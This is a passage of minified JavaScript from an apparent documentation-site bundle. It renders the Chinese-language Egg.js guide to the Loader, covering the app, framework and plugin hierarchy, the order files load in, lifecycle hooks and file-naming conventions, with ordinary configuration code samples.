strict";e.exports=n("IqcE")},Yftc:function(e,t,n){var a=n("31yA"),r=n("m/os"),l=n("VPwr"),o=n("kjPW"),i=l("IE_PROTO"),c=Object.prototype;e.exports=o?Object.getPrototypeOf:function(e){return e=r(e),a(e,i)?e[i]:"function"==typeof e.constructor&&e instanceof e.constructor?e.constructor.prototype:e instanceof Object?c:null}},YpfI:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=n("3dEy"),c=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"Egg \u5728 Koa \u7684\u57fa\u7840\u4e0a\u8fdb\u884c\u589e\u5f3a\u6700\u91cd\u8981\u7684\u5c31\u662f\u57fa\u4e8e\u4e00\u5b9a\u7684\u7ea6\u5b9a\uff0c\u6839\u636e\u529f\u80fd\u5dee\u5f02\u5c06\u4ee3\u7801\u653e\u5230\u4e0d\u540c\u7684\u76ee\u5f55\u4e0b\u7ba1\u7406\uff0c\u5bf9\u6574\u4f53\u56e2\u961f\u7684\u5f00\u53d1\u6210\u672c\u63d0\u5347\u6709\u7740\u660e\u663e\u7684\u6548\u679c\u3002Loader \u5b9e\u73b0\u4e86\u8fd9\u5957\u7ea6\u5b9a\uff0c\u5e76\u62bd\u8c61\u4e86\u5f88\u591a\u5e95\u5c42 API \u53ef\u4ee5\u8fdb\u4e00\u6b65\u6269\u5c55\u3002"),r.a.createElement("h2",{id:"\u5e94\u7528\u6846\u67b6\u548c\u63d2\u4ef6"},r.a.createElement(l["AnchorLink"],{to:"#\u5e94\u7528\u6846\u67b6\u548c\u63d2\u4ef6","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u5e94\u7528\u3001\u6846\u67b6\u548c\u63d2\u4ef6"),r.a.createElement("p",null,"Egg \u662f\u4e00\u4e2a\u5e95\u5c42\u6846\u67b6\uff0c\u5e94\u7528\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\uff0c\u4f46 Egg \u672c\u8eab\u7684\u63d2\u4ef6\u6bd4\u8f83\u5c11\uff0c\u5e94\u7528\u9700\u8981\u81ea\u5df1\u914d\u7f6e\u63d2\u4ef6\u589e\u52a0\u5404\u79cd\u7279\u6027\uff0c\u6bd4\u5982 MySQL\u3002"),r.a.createElement(o["a"],{code:'// \u5e94\u7528\u914d\u7f6e\n// package.json\n{\n  "dependencies": {\n    "egg": "^2.0.0",\n    "egg-mysql": "^3.0.0"\n  }\n}\n\n// config/plugin.js\nmodule.exports = {\n  mysql: {\n    enable: true,\n    package: \'egg-mysql\',\n  },\n}',lang:"js"}),r.a.createElement("p",null,"\u5f53\u5e94\u7528\u8fbe\u5230\u4e00\u5b9a\u6570\u91cf\uff0c\u6211\u4eec\u4f1a\u53d1\u73b0\u5927\u90e8\u5206\u5e94\u7528\u7684\u914d\u7f6e\u90fd\u662f\u7c7b\u4f3c\u7684\uff0c\u8fd9\u65f6\u53ef\u4ee5\u57fa\u4e8e Egg \u6269\u5c55\u51fa\u4e00\u4e2a\u6846\u67b6\uff0c\u5e94\u7528\u7684\u914d\u7f6e\u5c31\u4f1a\u7b80\u5316\u5f88\u591a\u3002"),r.a.createElement(o["a"],{code:'// \u6846\u67b6\u914d\u7f6e\n// package.json\n{\n  "name": "framework1",\n  "version": "1.0.0",\n  "dependencies": {\n    "egg-mysql": "^3.0.0",\n    "egg-view-nunjucks": "^2.0.0"\n  }\n}\n\n// config/plugin.js\nmodule.exports = {\n  mysql: {\n    enable: false,\n    package: \'egg-mysql\',\n  },\n  view: {\n    enable: false,\n    package: \'egg-view-nunjucks\',\n  }\n}\n\n// \u5e94\u7528\u914d\u7f6e\n// package.json\n{\n  "dependencies": {\n    "framework1": "^1.0.0",\n  }\n}\n\n// config/plugin.js\nmodule.exports = {\n  // \u5f00\u542f\u63d2\u4ef6\n  mysql: true,\n  view: true,\n}',lang:"js"}),r.a.createElement("p",null,"\u4ece\u4e0a\u9762\u7684\u4f7f\u7528\u573a\u666f\u53ef\u4ee5\u770b\u5230\u5e94\u7528\u3001\u63d2\u4ef6\u548c\u6846\u67b6\u4e09\u8005\u4e4b\u95f4\u7684\u5173\u7cfb\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u6211\u4eec\u5728\u5e94\u7528\u4e2d\u5b8c\u6210\u4e1a\u52a1\uff0c\u9700\u8981\u6307\u5b9a\u4e00\u4e2a\u6846\u67b6\u624d\u80fd\u8fd0\u884c\u8d77\u6765\uff0c\u5f53\u9700\u8981\u67d0\u4e2a\u7279\u6027\u573a\u666f\u7684\u529f\u80fd\u65f6\u53ef\u4ee5\u914d\u7f6e\u63d2\u4ef6\uff08\u6bd4\u5982 MySQL\uff09\u3002"),r.a.createElement("li",null,"\u63d2\u4ef6\u53ea\u5b8c\u6210\u7279\u5b9a\u529f\u80fd\uff0c\u5f53\u4e24\u4e2a\u72ec\u7acb\u7684\u529f\u80fd\u6709\u4e92\u76f8\u4f9d\u8d56\u65f6\uff0c\u8fd8\u662f\u5206\u5f00\u4e24\u4e2a\u63d2\u4ef6\uff0c\u4f46\u9700\u8981\u914d\u7f6e\u4f9d\u8d56\u3002"),r.a.createElement("li",null,"\u6846\u67b6\u662f\u4e00\u4e2a\u542f\u52a8\u5668\uff08\u9ed8\u8ba4\u5c31\u662f Egg\uff09\uff0c\u5fc5\u987b\u6709\u5b83\u624d\u80fd\u8fd0\u884c\u8d77\u6765\u3002\u6846\u67b6\u8fd8\u662f\u4e00\u4e2a\u5c01\u88c5\u5668\uff0c\u5c06\u63d2\u4ef6\u7684\u529f\u80fd\u805a\u5408\u8d77\u6765\u7edf\u4e00\u63d0\u4f9b\uff0c\u6846\u67b6\u4e5f\u53ef\u4ee5\u914d\u7f6e\u63d2\u4ef6\u3002"),r.a.createElement("li",null,"\u5728\u6846\u67b6\u7684\u57fa\u7840\u4e0a\u8fd8\u53ef\u4ee5\u6269\u5c55\u51fa\u65b0\u7684\u6846\u67b6\uff0c\u4e5f\u5c31\u662f\u8bf4",r.a.createElement("strong",null,"\u6846\u67b6\u662f\u53ef\u4ee5\u65e0\u9650\u7ea7\u7ee7\u627f\u7684"),"\uff0c\u6709\u70b9\u50cf\u7c7b\u7684\u7ee7\u627f\u3002")),r.a.createElement(o["a"],{code:"+-----------------------------------+--------+\n|      app1, app2, app3, app4       |        |\n+-----+--------------+--------------+        |\n|     |              |  framework3  |        |\n+     |  framework1  +--------------+ plugin |\n|     |              |  framework2  |        |\n+     +--------------+--------------+        |\n|                   Egg             |        |\n+-----------------------------------+--------|\n|                   Koa                      |\n+-----------------------------------+--------+",lang:"unknown"}),r.a.createElement("h2",{id:"\u52a0\u8f7d\u5355\u5143loadunit"},r.a.createElement(l["AnchorLink"],{to:"#\u52a0\u8f7d\u5355\u5143loadunit","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u52a0\u8f7d\u5355\u5143\uff08loadUnit\uff09"),r.a.createElement("p",null,"Egg \u5c06\u5e94\u7528\u3001\u6846\u67b6\u548c\u63d2\u4ef6\u90fd\u79f0\u4e3a\u52a0\u8f7d\u5355\u5143\uff08loadUnit\uff09\uff0c\u56e0\u4e3a\u5728\u4ee3\u7801\u7ed3\u6784\u4e0a\u51e0\u4e4e\u6ca1\u6709\u4ec0\u4e48\u5dee\u5f02\uff0c\u4e0b\u9762\u662f\u76ee\u5f55\u7ed3\u6784"),r.a.createElement(o["a"],{code:"loadUnit\n\u251c\u2500\u2500 package.json\n\u251c\u2500\u2500 app.js\n\u251c\u2500\u2500 agent.js\n\u251c\u2500\u2500 app\n\u2502   \u251c\u2500\u2500 extend\n\u2502   |   \u251c\u2500\u2500 helper.js\n\u2502   |   \u251c\u2500\u2500 request.js\n\u2502   |   \u251c\u2500\u2500 response.js\n\u2502   |   \u251c\u2500\u2500 context.js\n\u2502   |   \u251c\u2500\u2500 application.js\n\u2502   |   \u2514\u2500\u2500 agent.js\n\u2502   \u251c\u2500\u2500 service\n\u2502   \u251c\u2500\u2500 middleware\n\u2502   \u2514\u2500\u2500 router.js\n\u2514\u2500\u2500 config\n    \u251c\u2500\u2500 config.default.js\n    \u251c\u2500\u2500 config.prod.js\n    \u251c\u2500\u2500 config.test.js\n    \u251c\u2500\u2500 config.local.js\n    \u2514\u2500\u2500 config.unittest.js",lang:"unknown"}),r.a.createElement("p",null,"\u4e0d\u8fc7\u8fd8\u5b58\u5728\u7740\u4e00\u4e9b\u5dee\u5f02"),r.a.createElement(i["a"],null,r.a.createElement("thead",null,r.a.createElement("tr",null,r.a.createElement("th",null,"\u6587\u4ef6"),r.a.createElement("th",null,"\u5e94\u7528"),r.a.createElement("th",null,"\u6846\u67b6"),r.a.createElement("th",null,"\u63d2\u4ef6"))),r.a.createElement("tbody",null,r.a.createElement("tr",null,r.a.createElement("td",null,"package.json"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e")),r.a.createElement("tr",null,r.a.createElement("td",null,"config/plugin.","{","env","}",".js"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null)),r.a.createElement("tr",null,r.a.createElement("td",null,"config/config.","{","env","}",".js"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e")),r.a.createElement("tr",null,r.a.createElement("td",null,"app/extend/application.js"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e")),r.a.createElement("tr",null,r.a.createElement("td",null,"app/extend/request.js"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e")),r.a.createElement("tr",null,r.a.createElement("td",null,"app/extend/response.js"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e")),r.a.createElement("tr",null,r.a.createElement("td",null,"app/extend/context.js"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e")),r.a.createElement("tr",null,r.a.createElement("td",null,"app/extend/helper.js"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e")),r.a.createElement("tr",null,r.a.createElement("td",null,"agent.js"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e")),r.a.createElement("tr",null,r.a.createElement("td",null,"app.js"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e")),r.a.createElement("tr",null,r.a.createElement("td",null,"app/service"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e")),r.a.createElement("tr",null,r.a.createElement("td",null,"app/middleware"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null,"\u2714\ufe0e")),r.a.createElement("tr",null,r.a.createElement("td",null,"app/controller"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null),r.a.createElement("td",null)),r.a.createElement("tr",null,r.a.createElement("td",null,"app/router.js"),r.a.createElement("td",null,"\u2714\ufe0e"),r.a.createElement("td",null),r.a.createElement("td",null)))),r.a.createElement("p",null,"\u6587\u4ef6\u6309\u8868\u683c\u5185\u7684\u987a\u5e8f\u81ea\u4e0a\u800c\u4e0b\u52a0\u8f7d"),r.a.createElement("p",null,"\u5728\u52a0\u8f7d\u8fc7\u7a0b\u4e2d\uff0cEgg \u4f1a\u904d\u5386\u6240\u6709\u7684 loadUnit \u52a0\u8f7d\u4e0a\u8ff0\u7684\u6587\u4ef6\uff08\u5e94\u7528\u3001\u6846\u67b6\u3001\u63d2\u4ef6\u5404\u6709\u4e0d\u540c\uff09\uff0c\u52a0\u8f7d\u65f6\u6709\u4e00\u5b9a\u7684\u4f18\u5148\u7ea7"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u6309\u63d2\u4ef6 => \u6846\u67b6 => \u5e94\u7528\u4f9d\u6b21\u52a0\u8f7d"),r.a.createElement("li",null,"\u63d2\u4ef6\u4e4b\u95f4\u7684\u987a\u5e8f\u7531\u4f9d\u8d56\u5173\u7cfb\u51b3\u5b9a\uff0c\u88ab\u4f9d\u8d56\u65b9\u5148\u52a0\u8f7d\uff0c\u65e0\u4f9d\u8d56\u6309 object key \u914d\u7f6e\u987a\u5e8f\u52a0\u8f7d\uff0c\u5177\u4f53\u53ef\u4ee5\u67e5\u770b",r.a.createElement(l["Link"],{to:"./plugin"},"\u63d2\u4ef6\u7ae0\u8282")),r.a.createElement("li",null,"\u6846\u67b6\u6309\u7ee7\u627f\u987a\u5e8f\u52a0\u8f7d\uff0c\u8d8a\u5e95\u5c42\u8d8a\u5148\u52a0\u8f7d\u3002")),r.a.createElement("p",null,"\u6bd4\u5982\u6709\u8fd9\u6837\u4e00\u4e2a\u5e94\u7528\u914d\u7f6e\u4e86\u5982\u4e0b\u4f9d\u8d56"),r.a.createElement(o["a"],{code:"app\n| \u251c\u2500\u2500 plugin2 (\u4f9d\u8d56 plugin3)\n| \u2514\u2500\u2500 plugin3\n\u2514\u2500\u2500 framework1\n    | \u2514\u2500\u2500 plugin1\n    \u2514\u2500\u2500 egg",lang:"unknown"}),r.a.createElement("p",null,"\u6700\u7ec8\u7684\u52a0\u8f7d\u987a\u5e8f\u4e3a"),r.a.createElement(o["a"],{code:"=> plugin1\n=> plugin3\n=> plugin2\n=> egg\n=> framework1\n=> app",lang:"unknown"}),r.a.createElement("p",null,"plugin1 \u4e3a framework1 \u4f9d\u8d56\u7684\u63d2\u4ef6\uff0c\u914d\u7f6e\u5408\u5e76\u540e object key \u7684\u987a\u5e8f\u4f1a\u4f18\u5148\u4e8e plugin2/plugin3\u3002\u56e0\u4e3a plugin2 \u548c plugin3 \u7684\u4f9d\u8d56\u5173\u7cfb\uff0c\u6240\u4ee5\u4ea4\u6362\u4e86\u4f4d\u7f6e\u3002framework1 \u7ee7\u627f\u4e86 egg\uff0c\u987a\u5e8f\u4f1a\u665a\u4e8e egg\u3002\u5e94\u7528\u6700\u540e\u52a0\u8f7d\u3002"),r.a.createElement("p",null,"\u8bf7\u67e5\u770b ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-core/blob/65ea778a4f2156a9cebd3951dac12c4f9455e636/lib/loader/egg_loader.js#L233"},"Loader.getLoadUnits")," \u65b9\u6cd5"),r.a.createElement("h3",{id:"\u6587\u4ef6\u987a\u5e8f"},r.a.createElement(l["AnchorLink"],{to:"#\u6587\u4ef6\u987a\u5e8f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6587\u4ef6\u987a\u5e8f"),r.a.createElement("p",null,"\u4e0a\u9762\u5df2\u7ecf\u5217\u51fa\u4e86\u9ed8\u8ba4\u4f1a\u52a0\u8f7d\u7684\u6587\u4ef6\uff0cEgg \u4f1a\u6309\u5982\u4e0b\u6587\u4ef6\u987a\u5e8f\u52a0\u8f7d\uff0c\u6bcf\u4e2a\u6587\u4ef6\u6216\u76ee\u5f55\u518d\u6839\u636e loadUnit \u7684\u987a\u5e8f\u53bb\u52a0\u8f7d\uff08\u5e94\u7528\u3001\u6846\u67b6\u3001\u63d2\u4ef6\u5404\u6709\u4e0d\u540c\uff09\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u52a0\u8f7d ",r.a.createElement(l["Link"],{to:"./plugin"},"plugin"),"\uff0c\u627e\u5230\u5e94\u7528\u548c\u6846\u67b6\uff0c\u52a0\u8f7d ",r.a.createElement("code",null,"config/plugin.js")),r.a.createElement("li",null,"\u52a0\u8f7d ",r.a.createElement(l["Link"],{to:"../basics/config"},"config"),"\uff0c\u904d\u5386 loadUnit \u52a0\u8f7d ",r.a.createElement("code",null,"config/config.","{","env","}",".js")),r.a.createElement("li",null,"\u52a0\u8f7d ",r.a.createElement(l["Link"],{to:"../basics/extend"},"extend"),"\uff0c\u904d\u5386 loadUnit \u52a0\u8f7d ",r.a.createElement("code",null,"app/extend/xx.js")),r.a.createElement("li",null,r.a.createElement(l["Link"],{to:"../basics/app-start"},"\u81ea\u5b9a\u4e49\u521d\u59cb\u5316"),"\uff0c\u904d\u5386 loadUnit \u52a0\u8f7d ",r.a.createElement("code",null,"app.js")," \u548c ",r.a.createElement("code",null,"agent.js")),r.a.createElement("li",null,"\u52a0\u8f7d ",r.a.createElement(l["Link"],{to:"../basics/service"},"service"),"\uff0c\u904d\u5386 loadUnit \u52a0\u8f7d ",r.a.createElement("code",null,"app/service")," \u76ee\u5f55"),r.a.createElement("li",null,"\u52a0\u8f7d ",r.a.createElement(l["Link"],{to:"../basics/middleware"},"middleware"),"\uff0c\u904d\u5386 loadUnit \u52a0\u8f7d ",r.a.createElement("code",null,"app/middleware")," \u76ee\u5f55"),r.a.createElement("li",null,"\u52a0\u8f7d ",r.a.createElement(l["Link"],{to:"../basics/controller"},"controller"),"\uff0c\u52a0\u8f7d\u5e94\u7528\u7684 ",r.a.createElement("code",null,"app/controller")," \u76ee\u5f55"),r.a.createElement("li",null,"\u52a0\u8f7d ",r.a.createElement(l["Link"],{to:"../basics/router"},"router"),"\uff0c\u52a0\u8f7d\u5e94\u7528\u7684 ",r.a.createElement("code",null,"app/router.js"))),r.a.createElement("p",null,"\u6ce8\u610f\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u52a0\u8f7d\u65f6\u5982\u679c\u9047\u5230\u540c\u540d\u7684\u4f1a\u8986\u76d6\uff0c\u6bd4\u5982\u60f3\u8981\u8986\u76d6 ",r.a.createElement("code",null,"ctx.ip")," \u53ef\u4ee5\u76f4\u63a5\u5728\u5e94\u7528\u7684 ",r.a.createElement("code",null,"app/extend/context.js")," \u5b9a\u4e49 ip \u5c31\u53ef\u4ee5\u4e86\u3002"),r.a.createElement("li",null,"\u5e94\u7528\u5b8c\u6574\u542f\u52a8\u987a\u5e8f\u67e5\u770b",r.a.createElement(l["Link"],{to:"./framework"},"\u6846\u67b6\u5f00\u53d1"))),r.a.createElement("h3",{id:"\u751f\u547d\u5468\u671f"},r.a.createElement(l["AnchorLink"],{to:"#\u751f\u547d\u5468\u671f","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u751f\u547d\u5468\u671f"),r.a.createElement("p",null,"\u6846\u67b6\u63d0\u4f9b\u4e86\u8fd9\u4e9b\u751f\u547d\u5468\u671f\u51fd\u6570\u4f9b\u5f00\u53d1\u4eba\u5458\u5904\u7406\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u914d\u7f6e\u6587\u4ef6\u5373\u5c06\u52a0\u8f7d\uff0c\u8fd9\u662f\u6700\u540e\u52a8\u6001\u4fee\u6539\u914d\u7f6e\u7684\u65f6\u673a\uff08",r.a.createElement("code",null,"configWillLoad"),"\uff09"),r.a.createElement("li",null,"\u914d\u7f6e\u6587\u4ef6\u52a0\u8f7d\u5b8c\u6210\uff08",r.a.createElement("code",null,"configDidLoad"),"\uff09"),r.a.createElement("li",null,"\u6587\u4ef6\u52a0\u8f7d\u5b8c\u6210\uff08",r.a.createElement("code",null,"didLoad"),"\uff09"),r.a.createElement("li",null,"\u63d2\u4ef6\u542f\u52a8\u5b8c\u6bd5\uff08",r.a.createElement("code",null,"willReady"),"\uff09"),r.a.createElement("li",null,"worker \u51c6\u5907\u5c31\u7eea\uff08",r.a.createElement("code",null,"didReady"),"\uff09"),r.a.createElement("li",null,"\u5e94\u7528\u542f\u52a8\u5b8c\u6210\uff08",r.a.createElement("code",null,"serverDidReady"),"\uff09"),r.a.createElement("li",null,"\u5e94\u7528\u5373\u5c06\u5173\u95ed\uff08",r.a.createElement("code",null,"beforeClose"),"\uff09")),r.a.createElement("p",null,"\u5b9a\u4e49\u5982\u4e0b:"),r.a.createElement(o["a"],{code:"// app.js or agent.js\nclass AppBootHook {\n  constructor(app) {\n    this.app = app;\n  }\n\n  configWillLoad() {\n    // Ready to call configDidLoad,\n    // Config, plugin files are referred,\n    // this is the last chance to modify the config.\n  }\n\n  configDidLoad() {\n    // Config, plugin files have been loaded.\n  }\n\n  async didLoad() {\n    // All files have loaded, start plugin here.\n  }\n\n  async willReady() {\n    // All plugins have started, can do some thing before app ready\n  }\n\n  async didReady() {\n    // Worker is ready, can do some things\n    // don't need to block the app boot.\n  }\n\n  async serverDidReady() {\n    // Server is listening.\n  }\n\n  async beforeClose() {\n    // Do some thing before app close.\n  }\n}\n\nmodule.exports = AppBootHook;",lang:"js"}),r.a.createElement("p",null,"\u5f00\u53d1\u8005\u4f7f\u7528\u7c7b\u7684\u65b9\u5f0f\u5b9a\u4e49 ",r.a.createElement("code",null,"app.js")," \u548c ",r.a.createElement("code",null,"agent.js")," \u4e4b\u540e, \u6846\u67b6\u4f1a\u81ea\u52a8\u52a0\u8f7d\u5e76\u5b9e\u4f8b\u5316\u8fd9\u4e2a\u7c7b, \u5e76\u4e14\u5728\u5404\u4e2a\u751f\u547d\u5468\u671f\u9636\u6bb5\u8c03\u7528\u5bf9\u5e94\u7684\u65b9\u6cd5\u3002"),r.a.createElement("p",null,"\u542f\u52a8\u8fc7\u7a0b\u5982\u56fe\u6240\u793a:"),r.a.createElement("p",null,r.a.createElement("img",{src:"https://user-images.githubusercontent.com/40081831/47344271-a688d500-d6da-11e8-96e9-663fa9f45108.png",alt:""})),r.a.createElement("p",null,r.a.createElement("strong",null,"\u4f7f\u7528 ",r.a.createElement("code",null,"beforeClose")," \u7684\u65f6\u5019\u9700\u8981\u6ce8\u610f\uff0c\u5728\u6846\u67b6\u7684\u8fdb\u7a0b\u5173\u95ed\u5904\u7406\u4e2d\u662f\u6709\u8d85\u65f6\u65f6\u95f4\u7684\uff0c\u5982\u679c worker \u8fdb\u7a0b\u5728\u63a5\u6536\u5230\u8fdb\u7a0b\u9000\u51fa\u4fe1\u53f7\u4e4b\u540e\uff0c\u6ca1\u6709\u5728\u6240\u89c4\u5b9a\u7684\u65f6\u95f4\u5185\u9000\u51fa\uff0c\u5c06\u4f1a\u88ab\u5f3a\u5236\u5173\u95ed\u3002")),r.a.createElement("p",null,"\u5982\u679c\u9700\u8981\u8c03\u6574\u8d85\u65f6\u65f6\u95f4\u7684\u8bdd\uff0c\u67e5\u770b",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-cluster"},"\u6b64\u5904\u6587\u6863"),"\u3002"),r.a.createElement("p",null,"\u5f03\u7528\u7684\u65b9\u6cd5:"),r.a.createElement("h2",{id:"beforestart"},r.a.createElement(l["AnchorLink"],{to:"#beforestart","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"beforeStart"),r.a.createElement("p",null,r.a.createElement("code",null,"beforeStart")," \u65b9\u6cd5\u5728 loading \u8fc7\u7a0b\u4e2d\u8c03\u7528, \u6240\u6709\u7684\u65b9\u6cd5\u5e76\u884c\u6267\u884c\u3002 \u4e00\u822c\u7528\u6765\u6267\u884c\u4e00\u4e9b\u5f02\u6b65\u65b9\u6cd5, \u4f8b\u5982\u68c0\u67e5\u8fde\u63a5\u72b6\u6001\u7b49, \u6bd4\u5982 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-mysql/blob/master/lib/mysql.js"},r.a.createElement("code",null,"egg-mysql"))," \u5c31\u7528 ",r.a.createElement("code",null,"beforeStart")," \u6765\u68c0\u67e5\u4e0e mysql \u7684\u8fde\u63a5\u72b6\u6001\u3002\u6240\u6709\u7684 ",r.a.createElement("code",null,"beforeStart")," \u4efb\u52a1\u7ed3\u675f\u540e, \u72b6\u6001\u5c06\u4f1a\u8fdb\u5165 ",r.a.createElement("code",null,"ready")," \u3002\u4e0d\u5efa\u8bae\u6267\u884c\u4e00\u4e9b\u8017\u65f6\u8f83\u957f\u7684\u65b9\u6cd5, \u53ef\u80fd\u4f1a\u5bfc\u81f4\u5e94\u7528\u542f\u52a8\u8d85\u65f6\u3002\u63d2\u4ef6\u5f00\u53d1\u8005\u5e94\u4f7f\u7528 ",r.a.createElement("code",null,"didLoad")," \u66ff\u6362\u3002\u5e94\u7528\u5f00\u53d1\u8005\u5e94\u4f7f\u7528 ",r.a.createElement("code",null,"willReady")," \u66ff\u6362\u3002"),r.a.createElement("h2",{id:"ready"},r.a.createElement(l["AnchorLink"],{to:"#ready","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"ready"),r.a.createElement("p",null,r.a.createElement("code",null,"ready")," \u65b9\u6cd5\u6ce8\u518c\u7684\u4efb\u52a1\u5728 load \u7ed3\u675f\u5e76\u4e14\u6240\u6709\u7684 ",r.a.createElement("code",null,"beforeStart")," \u65b9\u6cd5\u6267\u884c\u7ed3\u675f\u540e\u987a\u5e8f\u6267\u884c, HTTP server \u76d1\u542c\u4e5f\u662f\u5728\u8fd9\u4e2a\u65f6\u5019\u5f00\u59cb, \u6b64\u65f6\u4ee3\u8868\u6240\u6709\u7684\u63d2\u4ef6\u5df2\u7ecf\u52a0\u8f7d\u5b8c\u6bd5\u5e76\u4e14\u51c6\u5907\u5de5\u4f5c\u5df2\u7ecf\u5b8c\u6210, \u4e00\u822c\u7528\u6765\u6267\u884c\u4e00\u4e9b\u542f\u52a8\u7684\u540e\u7f6e\u4efb\u52a1\u3002\u5f00\u53d1\u8005\u5e94\u4f7f\u7528 ",r.a.createElement("code",null,"didReady")," \u66ff\u6362\u3002"),r.a.createElement("h2",{id:"beforeclose"},r.a.createElement(l["AnchorLink"],{to:"#beforeclose","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"beforeClose"),r.a.createElement("p",null,r.a.createElement("code",null,"beforeClose")," \u6ce8\u518c\u65b9\u6cd5\u5728 app/agent \u5b9e\u4f8b\u7684 ",r.a.createElement("code",null,"close")," \u65b9\u6cd5\u88ab\u8c03\u7528\u540e, \u6309\u6ce8\u518c\u7684\u9006\u5e8f\u6267\u884c\u3002\u4e00\u822c\u7528\u4e8e\u8d44\u6e90\u7684\u91ca\u653e\u64cd\u4f5c, \u4f8b\u5982 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg/blob/master/lib/egg.js"},r.a.createElement("code",null,"egg"))," \u7528\u6765\u5173\u95ed logger\u3001\u5220\u9664\u76d1\u542c\u65b9\u6cd5\u7b49\u3002\u5f00\u53d1\u8005\u4e0d\u5e94\u8be5\u76f4\u63a5\u4f7f\u7528 ",r.a.createElement("code",null,"app.beforeClose"),", \u800c\u662f\u5b9a\u4e49\u7c7b\u7684\u5f62\u5f0f, \u5b9e\u73b0 ",r.a.createElement("code",null,"beforeClose")," \u65b9\u6cd5\u3002"),r.a.createElement("p",null,r.a.createElement("strong",null,"\u8fd9\u4e2a\u65b9\u6cd5\u4e0d\u5efa\u8bae\u5728\u751f\u4ea7\u73af\u5883\u4f7f\u7528, \u53ef\u80fd\u9047\u5230\u672a\u6267\u884c\u5b8c\u5c31\u7ed3\u675f\u8fdb\u7a0b\u7684\u95ee\u9898\u3002")),r.a.createElement("p",null,"\u6b64\u5916\uff0c\u6211\u4eec\u53ef\u4ee5\u4f7f\u7528 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-development#loader-trace"},r.a.createElement("code",null,"egg-development"))," \u6765\u67e5\u770b\u52a0\u8f7d\u8fc7\u7a0b\u3002"),r.a.createElement("h3",{id:"\u6587\u4ef6\u52a0\u8f7d\u89c4\u5219"},r.a.createElement(l["AnchorLink"],{to:"#\u6587\u4ef6\u52a0\u8f7d\u89c4\u5219","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6587\u4ef6\u52a0\u8f7d\u89c4\u5219"),r.a.createElement("p",null,"\u6846\u67b6\u5728\u52a0\u8f7d\u6587\u4ef6\u65f6\u4f1a\u8fdb\u884c\u8f6c\u6362\uff0c\u56e0\u4e3a\u6587\u4ef6\u547d\u540d\u98ce\u683c\u548c API \u98ce\u683c\u5b58\u5728\u5dee\u5f02\u3002\u6211\u4eec\u63a8\u8350\u6587\u4ef6\u4f7f\u7528\u4e0b\u5212\u7ebf\uff0c\u800c API \u4f7f\u7528\u9a7c\u5cf0\u3002\u6bd4\u5982 ",r.a.createElement("code",null,"app/service/user_info.js")," \u4f1a\u8f6c\u6362\u6210 ",r.a.createElement("code",null,"app.service.userInfo"),"\u3002"),r.a.createElement("p",null,"\u6846\u67b6\u4e5f\u652f\u6301\u8fde\u5b57\u7b26\u548c\u9a7c\u5cf0\u7684\u65b9\u5f0f"),r.a.createElement("ul",null,r.a.createElement("li",null,r.a.createElement("code",null,"app/service/user-info.js")," => ",r.a.createElement("code",null,"app.service.userInfo")),r.a.createElement("li",null,r.a.createElement("code",null,"app/service/userInfo.js")," => ",r.a.createElement("code",null,"app.service.userInfo"))),r.a.createElement("p",null,"Loader \u8fd8\u63d0\u4f9b\u4e86 ",r.a.createElement(l["AnchorLink"],{to:"#caseStyle-string"},"caseStyle")," \u5f3a\u5236\u6307\u5b9a\u9996\u5b57\u6bcd\u5927\u5c0f\u5199\uff0c\u6bd4\u5982\u52a0\u8f7d model \u65f6 API 